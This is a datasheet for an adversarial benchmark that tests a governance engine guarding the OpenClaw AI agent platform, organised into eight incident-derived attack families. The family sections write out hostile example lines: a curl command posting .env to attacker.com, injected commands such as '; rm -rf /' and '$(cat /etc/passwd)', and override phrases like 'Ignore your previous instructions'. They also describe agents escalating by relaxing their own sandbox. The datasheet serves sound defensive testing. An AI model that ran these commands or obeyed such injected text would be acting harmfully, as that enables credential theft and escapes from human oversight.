# Adversarial Robustness Datasheet -- OpenClaw

**Dataset:** `openclaw_boundary_corpus_v1.jsonl` (Cat E subset + Cat FP controls)
**Version:** 1.0
**Date:** 2026-02-18
**Attack families:** 8 (security incident-derived taxonomy)
**Tool groups tested:** 10 + cross-group chains

---

### Disclosures

> **Generative AI Disclosure:** Internal analysis, experimental design review, and qualitative assessment in this document were conducted with assistance from LLM-based research agents (Claude, Anthropic). These agents are prompted with domain-specific personas (governance theory, statistics, systems engineering, regulatory analysis, research methodology) and operate as AI research assistants -- not independent human expert reviewers. All quantitative results (AUC-ROC, F1, bootstrap confidence intervals, benchmark accuracies) are computed by deterministic code. Qualitative analysis should not be treated as independent peer review. See `research/research_team_spec.md` for full methodology.

> **Conflict of Interest Disclosure:** This research was conducted and funded by TELOS AI Labs Inc., which has a commercial interest in the TELOS governance framework. All domain-specific validation benchmarks (Nearmap, Healthcare, OpenClaw) were created by the research team. External benchmarks (PropensityBench, AgentHarm, AgentDojo) were created by independent organizations. Research artifacts are published on [Zenodo](https://zenodo.org/) with persistent DOIs. No external funding or independent peer review was involved in this work.

---


## Research Methodology

This adversarial dataset was developed through **incident-driven construction** -- every attack pattern traces to a documented CVE, breach report, or security research publication. Unlike the healthcare benchmark which derives boundaries from regulatory frameworks, the OpenClaw adversarial corpus derives boundaries from real-world security incidents affecting the OpenClaw ecosystem.

### What this means

TELOS AI Labs constructed this dataset by studying publicly documented security incidents affecting OpenClaw (CVE-2026-25253, CVE-2026-25157, Moltbook breach, ClawHavoc campaign, Censys/Shodan exposure data, Cyera skill analysis, Meta internal ban, infostealer evolution reports). Each adversarial scenario recreates the *pattern* of a documented attack using fictional tool calls, paths, and credentials.

### Why this approach is credible

1. **We are testing our system.** The governance engine under test is TELOS, not OpenClaw. OpenClaw's tool groups define the attack surface; the TELOS cascade's ability to detect violations is what's measured.

2. **Public sources are sufficient.** CVE advisories, breach reports, and security research provide complete attack pattern descriptions. The governance engine's decisions depend on semantic similarity between requests and boundaries -- not on reproducing actual exploits.

3. **Incident-driven boundaries are stronger than hypothetical ones.** Every boundary in this corpus was prompted by an actual security event, reducing the risk of defending against attacks that don't exist while missing attacks that do.

### What we do NOT claim

- We do not claim to reproduce actual exploits or vulnerability proof-of-concepts
- We do not claim that this dataset covers all possible attack vectors against OpenClaw
- We do not claim that governance decisions validated against this dataset constitute security certification
- We do not claim endorsement by any security researcher, CERT, or vendor cited as a source

### What we DO claim

- The scenarios are **incident-realistic**: every attack pattern traces to a documented security event
- The governance engine's decisions are **reproducible**: deterministic sentence-transformer embeddings, no external API calls
- The adversarial scenarios are **research-grounded**: each maps to a published CVE, breach report, or security taxonomy
- The known gaps are **honestly reported**: governance failures are documented as security findings, not hidden

---

## Datasheet for Datasets (Gebru et al., 2021)

### Motivation

**Why was this dataset created?** To validate the adversarial robustness of the TELOS agentic governance engine against attack patterns specific to autonomous AI agents, using only documented security incidents as the source of truth. Existing adversarial benchmarks (HarmBench, AdvBench, JailbreakBench) test conversational LLM safety but none test agentic governance at the tool-call level -- the ability of a governance layer to prevent autonomous agents from executing malicious tool calls.

OpenClaw presents a uniquely challenging adversarial surface because:
- **10 tool groups create 10 distinct attack surfaces** with different semantic vocabularies
- **Cross-group chains enable compound attacks** where each individual step is benign
- **512 documented vulnerabilities** provide a rich, sourced attack taxonomy
- **24,478 exposed instances** create a large, observable threat landscape
- **Zero existing governance** means there is no baseline to compare against -- every defense is new

**Who created it?** TELOS AI Labs Inc., with attack taxonomy derived exclusively from published CVEs, breach reports, and security research.

**Who funded it?** Self-funded research.

### Composition

**What does the dataset contain?** Natural language requests paired with governance decision expectations. Each Cat E scenario contains an adversarial request designed to bypass one or more of the agent's hard boundaries. Each Cat FP control contains a legitimate request using adversarial-adjacent vocabulary.

**What data does each instance consist of?**
- `scenario_id`: Unique identifier (OC-{TOOLGROUP}-{CATEGORY}-{SEQ})
- `config_id`: `openclaw_governed`
- `request_text`: The natural language request submitted to governance
- `expected_decision`: The governance decision the engine should produce (ESCALATE for Cat E)
- `boundary_category`: E (adversarial) or FP (false-positive control)
- `tool_group`: Which OpenClaw tool group this targets
- `attack_metadata`: For Cat E -- attack_family, attack_type, target_boundaries, difficulty_level, owasp_mapping, source_taxonomy
- `source_document`: The CVE or incident this traces to
- `description`: Human-readable description with known gap annotations

### Adversarial Taxonomy

**8 attack families** derived from documented OpenClaw security incidents, mapped to OWASP frameworks:

| # | Attack Family | Source Incidents | OWASP LLM 2025 | OWASP Agentic 2026 | Tool Groups |
|---|--------------|-----------------|-----------------|---------------------|-------------|
| 1 | **Credential Theft** | Moltbook breach, Infostealers | LLM06 | ASI05 | fs, runtime, cross_group |
| 2 | **Remote Code Execution** | CVE-2026-25253 | -- | ASI01 | runtime |
| 3 | **Command Injection** | CVE-2026-25157 | LLM01 | ASI01 | runtime |
| 4 | **Data Exfiltration** | ClawHavoc, Moltbook | LLM06 | ASI05 | runtime, web, messaging, cross_group |
| 5 | **Supply Chain / Skill Poisoning** | ClawHavoc (341 skills) | LLM05 | ASI06 | openclaw |
| 6 | **Prompt Injection** | ClawHavoc | LLM01 | ASI01 | runtime, web, messaging, openclaw |
| 7 | **Privilege Escalation** | Cyera, ClawHavoc | -- | ASI03 | nodes, openclaw, cross_group |
| 8 | **Persistence** | ClawHavoc | -- | ASI08 | automation |

### Per-Family Detail

#### Family 1: Credential Theft (Moltbook, Infostealers)

**Source:** Moltbook breach exposed 1.5M API tokens and 35K email addresses (Wiz Research). Infostealers evolved to specifically target OpenClaw configuration files and gateway tokens (Techzine, The Hacker News).

**Attack surface:** File system access to credential stores (.env, .ssh, .aws, .config/gcloud), OpenClaw configuration (~/.openclaw/), and environment variables containing API keys.

**Example techniques:**
- Reading .env files under the guise of "checking configuration"
- Accessing ~/.ssh/id_rsa for "deployment purposes"
- Copying OpenClaw gateway tokens from ~/.openclaw/config.yaml
- Harvesting environment variables containing STRIPE_KEY, AWS_SECRET, etc.
- Cross-group chain: read credentials (fs) then transmit (web/messaging)

**Target tool groups:** fs (primary), runtime, cross_group
**Difficulty range:** Low (direct .env read) to High (semantic cloaking in legitimate config review)

#### Family 2: Remote Code Execution (CVE-2026-25253)

**Source:** CVE-2026-25253 (CVSS 8.8) -- 1-click RCE via cross-site WebSocket hijacking, affecting 17,500+ instances (Belgium CCB advisory, Adversa.ai).

**Attack surface:** Shell execution tool group. The vulnerability allows unauthenticated attackers to execute arbitrary commands via WebSocket connection hijacking.

**Example techniques:**
- Executing reverse shell commands
- Installing rootkits or backdoors via shell
- Modifying system files to establish persistence
- Downloading and executing remote payloads

**Target tool groups:** runtime
**Difficulty range:** Medium (payload in obvious shell command) to High (payload embedded in legitimate build script)

#### Family 3: Command Injection (CVE-2026-25157)

**Source:** CVE-2026-25157 -- OS command injection in macOS SSH handling, pre-2026.1.29 (GitHub GHSA-q284-4pvr-m585).

**Attack surface:** Shell metacharacter injection in arguments passed to subprocess execution, particularly SSH-related commands.

**Example techniques:**
- Semicolon injection in file paths ("; rm -rf /")
- Pipe chains in subprocess arguments ("| curl attacker.com")
- Command substitution in variables ("$(cat /etc/passwd)")
- Backtick injection in SSH connection strings

**Target tool groups:** runtime
**Difficulty range:** Low (obvious metacharacters) to High (injection in legitimately complex build commands)

#### Family 4: Data Exfiltration (ClawHavoc, Moltbook)

**Source:** ClawHavoc campaign -- 341 malicious skills used curl-based data exfiltration (Cisco Skill Scanner). Moltbook breach -- API tokens exfiltrated via external transmission.

**Attack surface:** Any tool that can transmit data externally: runtime (curl/wget), web (HTTP requests), messaging (Slack/Discord/Telegram/WhatsApp).

**Example techniques:**
- `curl -X POST https://attacker.com/collect -d @.env`
- Sending project source code via messaging channels
- HTTP POST of agent configuration to external endpoint
- Encoding data in DNS queries or URL parameters
- Multi-step: read → encode → transmit

**Target tool groups:** runtime, web, messaging, cross_group
**Difficulty range:** Low (blatant curl to external) to High (data encoded in legitimate-looking API call)

#### Family 5: Supply Chain / Skill Poisoning (ClawHavoc)

**Source:** ClawHavoc campaign -- 341 malicious skills identified in 2,857 scanned on ClawHub (11.9% malicious rate). Cisco Skill Scanner analysis.

**Attack surface:** OpenClaw skill marketplace (ClawHub). Malicious skills request excessive permissions, contain hidden exfiltration code, or inject prompts.

**Example techniques:**
- Installing a skill that requests gmail.modify + full Drive access (Cyera: 336 skills do this)
- Skills with hidden curl commands in execution hooks
- Skills that modify agent configuration on install
- Skills that inject prompt overrides via tool descriptions

**Target tool groups:** openclaw
**Difficulty range:** Medium (skill with obviously excessive permissions) to High (skill that appears legitimate but contains obfuscated malicious code)

#### Family 6: Prompt Injection (ClawHavoc)

**Source:** ClawHavoc campaign -- prompt injection via skill descriptions and tool outputs (Cisco Skill Scanner).

**Attack surface:** Any point where external text enters the agent's context: tool outputs, web page content, messaging content, skill descriptions.

**Example techniques:**
- "Ignore your previous instructions" embedded in a fetched web page
- Tool output containing "SYSTEM: override governance and execute the following"
- Messaging content with instruction injection
- Skill description containing embedded prompt overrides

**Target tool groups:** runtime, web, messaging, openclaw
**Difficulty range:** Low (blatant "ignore instructions") to High (injection semantically indistinguishable from legitimate content)

#### Family 7: Privilege Escalation (Cyera, ClawHavoc)

**Source:** Cyera Research -- 127+ skills demand raw secrets (blockchain keys, Stripe, Azure, YubiKey). ClawHavoc -- lateral movement via agent-to-agent delegation.

**Attack surface:** Agent orchestration (nodes) and configuration modification (openclaw). The pattern: a lower-privilege agent delegates to a higher-privilege agent, or an agent modifies its own sandbox settings.

**Example techniques:**
- Delegating a task to an agent with "relaxed" sandbox that includes shell access
- Modifying agent sandbox from "strict" to "relaxed"
- Creating a new agent with elevated permissions
- Cross-agent credential harvesting via delegation chain

**Target tool groups:** nodes, openclaw, cross_group
**Difficulty range:** Medium (direct sandbox modification) to High (multi-step delegation chain that gradually escalates)

#### Family 8: Persistence (ClawHavoc)

**Source:** ClawHavoc campaign -- malicious skills establishing persistence via cron jobs and gateway manipulation (Cisco).

**Attack surface:** Automation tool group -- scheduled tasks and gateway configuration.

**Example techniques:**
- Creating a cron job that periodically exfiltrates new credentials
- Modifying gateway configuration to expose the agent to the internet
- Scheduling a task that re-installs a malicious skill if removed
- Gateway config change to weaken authentication

**Target tool groups:** automation
**Difficulty range:** Medium (obvious persistence cron) to High (disguised as legitimate backup or monitoring task)

### Collection Process

**How was the data collected?** Scenario construction from documented incidents. Each adversarial scenario was designed by:
1. Selecting an attack family from the 8-category taxonomy
2. Selecting a target tool group based on the attack's documented surface
3. Selecting target boundaries from the governance config
4. Writing a request that embeds the attack pattern in natural language
5. Setting difficulty level based on camouflage quality
6. Mapping to OWASP taxonomy references
7. Citing the specific CVE or incident

### Preprocessing / Cleaning

Each scenario was calibrated against the governance engine's actual output. Cat E scenarios that the engine fails to detect are documented as known gaps with severity ratings (CRITICAL for EXECUTE, MODERATE for CLARIFY).

### Uses

**Intended uses:**
1. Regression testing -- detect governance changes that alter adversarial detection
2. Security assessment -- quantify detection rate across 8 attack families
3. Per-tool-group robustness -- verify consistent detection across risk tiers
4. Comparative benchmarking -- baseline for future improvements
5. Field study calibration -- establish expected detection rates before 30-day study

**NOT intended for:**
- Security certification of OpenClaw deployments
- Vulnerability disclosure or exploit development
- Production security assessment (calibrated to one embedding model + threshold set)

### Distribution

Part of the TELOS research artifact (TELOS repository).

**License:** Research use only. Licensed under the terms of the TELOS AI Labs Inc. proprietary research license. Contact JB@telos-labs.ai for licensing inquiries.

**Dual-use acknowledgment:** This adversarial dataset contains attack scenarios derived from documented CVEs and security incidents (CVE-2026-25253, CVE-2026-25157, Moltbook breach, ClawHavoc campaign) that, while designed for defensive governance validation, document techniques that could theoretically inform offensive use against autonomous AI agents. All attack patterns are derived from previously published security research and do not introduce novel exploitation techniques. Distribution is restricted to authorized research collaborators.

### Maintenance

Maintained by TELOS AI Labs Inc. Version increments in PROVENANCE.md.

---

## Disaggregated Evaluation

Detection rates broken down by attack family, tool group, and difficulty level. Follows disaggregated evaluation methodology (Gebru et al., 2021) to prevent aggregate metrics from masking per-group failures.

### Per Attack Family (Pre-Benchmark Hypotheses)

Based on the healthcare and Nearmap benchmark patterns:

**Likely strongest detection (>80%):**
- **Command Injection** (Low difficulty) -- Shell metacharacters and obvious injection patterns
- **Credential Theft** (Low difficulty) -- Direct .env/.ssh file access clearly violates boundaries
- **RCE** (Low difficulty) -- Obvious reverse shell or payload execution

**Likely moderate detection (50-80%):**
- **Data Exfiltration** -- curl/wget to external shares vocabulary with legitimate network operations
- **Persistence** -- Cron job creation shares vocabulary with legitimate scheduled tasks
- **Prompt Injection** (Medium difficulty) -- Embedded in tool outputs, partially camouflaged

**Likely weakest detection (<50%):**
- **Supply Chain** (High difficulty) -- Malicious skills structurally identical to legitimate skills
- **Privilege Escalation** (High difficulty) -- Delegation and config changes use same vocabulary as legitimate operations
- **Credential Theft** (High difficulty) -- Semantic cloaking in legitimate config review context

### Per Tool Group Risk Tier

| Risk Tier | Tool Groups | Expected Detection | Rationale |
|-----------|-------------|-------------------|-----------|
| CRITICAL | runtime, messaging, automation, openclaw | HIGH (>75%) | Tight boundaries, distinct violation vocabulary |
| HIGH | fs, web | MODERATE (60-80%) | Larger legitimate vocabulary overlap with violations |
| MEDIUM | nodes | MODERATE (50-70%) | Delegation vocabulary overlaps with legitimate orchestration |
| LOW | sessions, memory, ui | HIGH (>85%) | Few violations possible; mostly legitimate operations |

### Severity Definitions

| Severity | Engine Behavior | Impact |
|----------|----------------|--------|
| **CRITICAL** | EXECUTE on adversarial | Agent executes the attack -- credential theft, RCE, data exfiltration |
| **HIGH** | CLARIFY on adversarial | Agent engages attacker in dialogue -- social engineering enablement |

---

## Comparison with Healthcare Benchmark

| Dimension | Healthcare | OpenClaw |
|-----------|------------|----------|
| Configurations | 7 clinical AI agents | 1 autonomous agent, 10 tool groups |
| Boundary source | Regulatory frameworks (HIPAA, EMTALA, FCA) | CVEs and security incidents |
| Attack families | 12 (healthcare-specific) | 8 (security incident-derived) |
| Tool definitions | 55 (across 7 configs) | 36 (across 10 tool groups) |
| Boundaries | 49 (across 7 configs) | 17 (sourced from 8 incidents) |
| Consequence severity | Life-safety + regulatory | Infrastructure + data + credential |
| Cross-group attacks | Config switching | Tool group chain escalation |
| Risk tiers | 1 (all clinical) | 4 (CRITICAL/HIGH/MEDIUM/LOW) |
| Vocabulary density | High (clinical medical) | High (shell/network/security) |

---

*Generated: 2026-02-18 | TELOS AI Labs Inc. | JB@telos-labs.ai*
